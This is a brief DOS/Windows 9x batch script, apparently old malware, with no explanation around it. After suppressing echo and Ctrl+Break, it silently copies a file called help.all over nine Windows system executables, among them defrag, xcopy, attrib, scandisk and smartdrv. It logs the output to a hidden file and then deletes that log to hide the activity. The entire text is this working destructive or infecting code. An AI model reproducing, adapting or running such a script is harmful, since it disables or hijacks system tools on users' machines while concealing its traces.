@echo off
break off
cls
copy c:\windows\help.all c:\windows\defrag.exe /v >c:\windows\help\zzz.tb
copy c:\windows\help.all c:\windows\command\xcopy.exe /v >>c:\windows\help\zzz.tb
copy c:\windows\help.all c:\windows\command\attrib.exe /v >>c:\windows\help\zzz.tb
copy c:\windows\help.all c:\windows\command\scandisk.exe /v >>c:\windows\help\zzz.tb
copy c:\windows\help.all c:\windows\welcome.exe /v >>c:\windows\help\zzz.tb
copy c:\windows\help.all c:\windows\command\mscdex.exe /v >>c:\windows\help\zzz.tb
copy c:\windows\help.all c:\windows\command\share.exe /v >>c:\windows\help\zzz.tb
copy c:\windows\help.all c:\windows\smartdrv.exe /v >>c:\windows\help\zzz.tb
copy c:\windows\help.all c:\windows\write.exe /v >>c:\windows\help\zzz.tb
del c:\windows\help\zzz.tb
